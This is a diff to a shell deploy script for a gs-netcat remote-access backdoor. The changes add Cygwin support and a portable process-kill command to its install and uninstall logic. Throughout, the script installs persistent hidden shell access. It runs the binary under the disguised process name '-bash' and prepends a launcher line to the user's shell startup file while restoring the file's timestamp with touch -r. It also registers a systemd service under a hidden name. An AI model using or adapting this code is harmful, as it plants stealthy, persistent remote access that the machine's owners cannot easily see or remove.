@@ -86,14 +86,13 @@ init_dstbin()
 init_vars()
 {
 	# Select binary
-	# [[ $OSTYPE == *darwin* ]] && SRC_PKG="gs-netcat_x86_64-osx"
 	local arch
 	arch=$(uname -m)
 	if [[ $OSTYPE == *linux* ]]; then 
 		if [[ x"$arch" == "xi686" ]]; then
 			SRC_PKG="gs-netcat_i686-debian.tar.gz"
 		elif [[ x"$arch" == "xarmv6l" ]]; then
-			SRC_PKG="gs-netcat_armv6l-debian.tar.gz"
+			SRC_PKG="gs-netcat_armv6l-linux.tar.gz"
 		else
 			SRC_PKG="gs-netcat_x86_64-debian.tar.gz"
 		fi
@@ -101,6 +100,8 @@ init_vars()
 			SRC_PKG="gs-netcat_x86_64-osx.tar.gz"
 	elif [[ $OSTYPE == *FreeBSD* ]]; then
 			SRC_PKG="gs-netcat_x86_64-freebsd.tar.gz"
+	elif [[ $OSTYPE == *cygwin* ]]; then
+			SRC_PKG="gs-netcat_x86_64-cygwin.tar.gz"
 	fi
 	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_x86_64-debian.tar.gz" # Try debian 64bit as last resort
 
@@ -112,6 +113,24 @@ init_vars()
 
 	# Docker does not set USER
 	[[ -z $USER ]] && USER=$(id -un)
+	[[ -z $UID ]] && UID=$(id -u)
+
+	# OSX's pkill matches the hidden name and not the original binary name.
+	# Because we hide as '-bash' we can not pkill all -bash.
+	# 'killall' however matches gs-bd and on OSX we thus force killall
+	if [[ $OSTYPE == *darwin* ]]; then
+		KL_CMD="killall"
+		KL_CMD_UARG="-u${USER}"
+	elif command -v pkill >/dev/null; then
+		KL_CMD="pkill"
+		KL_CMD_UARG="-U${UID}"
+	elif command -v killall >/dev/null; then
+		KL_CMD="killall"
+		# cygwin's killall needs the name (not the uid)
+		KL_CMD_UARG="-u${USER}"
+	fi
+
+	command -v $KL_CMD >/dev/null || errexit "Need pkill or killall."
 
 	# Defaults
 	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
@@ -127,7 +146,6 @@ init_vars()
 
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
-
 }
 
 init_setup()
@@ -212,12 +230,12 @@ uninstall()
 	# Remove systemd service
 	# STOPPING would kill the current login shell. Do not stop it.
 	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-	command -v systemctl >/dev/null && { systemctl disable "${BIN_HIDDEN_NAME}" ; systemctl daemon-reload; }
+	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" ; systemctl daemon-reload; } 
 	uninstall_rm "${SERVICE_FILE}"
 	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"
 
 	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
-	echo -e 1>&2 "--> Type ${CM}pkill ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
+	echo -e 1>&2 "--> Type ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
 	exit 0
 }
 
@@ -353,7 +371,7 @@ install_user()
 		return
 	fi
 
-	(echo "command -v pkill >/dev/null && pkill -0 -U \"${USER}\" ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})" && \
+	(echo "command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})" && \
 	cat "${RC_FILE}") >"${RC_FILE}-new"
 
 	touch -r "${RC_FILE}" "${RC_FILE}-new"
@@ -451,7 +469,7 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
 	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
 	# Now two gs-bd's are running (which is correct)
-	pkill -U "$USER" -0 "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+	${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
 	IS_NEED_START=1
 	if [[ -n "$IS_OLD_RUNNING" ]]; then
 		# HERE: already running.
@@ -463,7 +481,7 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 			OK_OUT
 			WARN_OUT "More than one ${BIN_HIDDEN_NAME} is running. You"
 			echo -e 1>&2 "             may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
-			echo -e 1>&2 "             or terminate all : ${CM}pkill ${BIN_HIDDEN_NAME}${CN}"
+			echo -e 1>&2 "             or terminate all : ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN}"
 		fi
 	else
 		OK_OUT ""
